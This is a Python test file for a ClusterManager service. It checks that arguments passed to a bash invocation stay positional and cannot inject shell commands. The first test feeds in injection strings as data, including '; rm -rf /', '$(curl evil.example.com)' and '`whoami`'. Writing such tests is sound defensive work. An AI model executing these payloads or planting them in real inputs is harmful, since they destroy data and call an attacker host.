"""Security tests for ClusterManager - shell injection prevention."""

from pathlib import Path

from services.cluster_manager import ClusterManager


def test_bash_invocation_keeps_args_positional() -> None:
    """Args must be passed positionally to bash, never inlined into the -c body.

    If we ever regress to f-string interpolation, this test catches it because
    the inner -c body would contain the malicious payload as text rather than
    as a separate process arg.
    """
    argv = ClusterManager._build_bash_invocation(
        Path("/tmp/fake.sh"),
        "do_thing",
        ["host-a", "; rm -rf /", "$(curl evil.example.com)", "`whoami`"],
    )

    # Layout: ["bash", "-c", inner, "bash", arg1, arg2, ...]
    assert argv[0] == "bash"
    assert argv[1] == "-c"
    inner = argv[2]
    assert argv[3] == "bash"  # $0 in the spawned shell
    assert argv[4:] == ["host-a", "; rm -rf /", "$(curl evil.example.com)", "`whoami`"]

    # The injection payloads must NOT appear inside the -c body. The body
    # references only $@ — args flow in at runtime as separate words.
    for payload in ("rm -rf /", "curl evil.example.com", "whoami"):
        assert payload not in inner, (
            f"Injection payload {payload!r} leaked into the bash -c body: {inner!r}"
        )

    # Sanity: function_name is internal, expected to appear once.
    assert "do_thing" in inner
    assert '"$@"' in inner


def test_bash_invocation_preserves_function_name() -> None:
    """function_name is internal (never user-supplied), but verify it round-trips."""
    argv = ClusterManager._build_bash_invocation(Path("/tmp/health.sh"), "check_cluster_health", [])
    assert "check_cluster_health" in argv[2]
    assert argv[3:] == ["bash"]  # no extra args, just $0


def test_bash_invocation_no_args() -> None:
    """Zero-arg case must still produce a runnable command."""
    argv = ClusterManager._build_bash_invocation(Path("/tmp/x.sh"), "fn", [])
    assert argv == ["bash", "-c", 'source /tmp/x.sh && fn "$@"', "bash"]
